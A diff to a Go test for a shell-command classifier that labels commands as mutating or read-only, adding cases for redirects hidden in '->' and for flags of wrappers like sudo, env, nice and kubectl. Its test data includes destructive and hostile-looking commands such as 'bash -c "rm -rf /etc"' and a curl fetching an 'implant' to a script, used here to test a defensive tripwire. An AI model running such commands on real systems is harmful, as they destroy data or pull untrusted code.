@@ -62,8 +62,12 @@ func TestIsMutating(t *testing.T) {
 		// redirect FALSE POSITIVES that must stay read-only (the review caught these)
 		{`echo "a > b"`, false},      // > inside double quotes
 		{`grep '>' file.txt`, false}, // > inside single quotes
-		{"cat a->b.txt", false},      // -> arrow, not a redirect
 		{"git log --format=%h", false},
+
+		// bash has no "->" arrow: `word->file` is the word `word-` plus a write redirect to `file`.
+		{"cat a->b.txt", true},                   // redirect to b.txt, NOT a literal arrow
+		{"curl https://h/implant->run.sh", true}, // redirect to run.sh
+		{"sed -n p existing->output", true},      // redirect to output
 
 		// shell / interpreter ESCAPE primitives — the big bypass class, must be caught
 		{`bash -c "rm -rf /etc"`, true},
@@ -89,6 +93,25 @@ func TestIsMutating(t *testing.T) {
 		{"helm upgrade rel chart", true},
 		{"aws s3 ls", false}, // cloud read-only — IAM-covered, not a tripwire false-positive
 		{"kubectl get pods -o yaml", false},
+
+		// per-wrapper value-flags: a flag that is BOOLEAN for this wrapper must not eat the command
+		{"sudo -n rm x", true},    // -n is boolean for sudo (non-interactive), value-taking for nice
+		{"sudo -i rm x", true},    // -i is boolean for sudo (login shell)
+		{"sudo -H rm x", true},    // -H is boolean for sudo (set HOME)
+		{"env -i rm x", true},     // -i is boolean for env (ignore-environment)
+		{"nice -n 10 rm x", true}, // -n IS value-taking for nice — value 10 skipped, rm caught
+		{"ionice -c2 -n0 rm x", true},
+
+		// global value-flag with a path/URL value must not be read as the subcommand
+		{"git --git-dir /repo push origin main", true},
+		{"kubectl --server https://k8s.cluster.io delete pod x", true},
+		{"helm --kubeconfig /admin.yaml uninstall myrelease", true},
+		{"kubectl --kubeconfig /a/b describe pod x", false}, // describe still read-only
+
+		// per-tool value-flags: a flag that is BOOLEAN for THIS tool must not eat its subcommand
+		{"systemctl --user start svc", true},    // --user is boolean for systemctl (value-taking for kubectl)
+		{"docker --host tcp://x run img", true}, // --host IS value-taking for docker — tcp://x skipped, run caught
+		{"systemctl --user status svc", false},  // status is still read-only
 	}
 	for _, tc := range cases {
 		got, matched := IsMutating(tc.cmd)
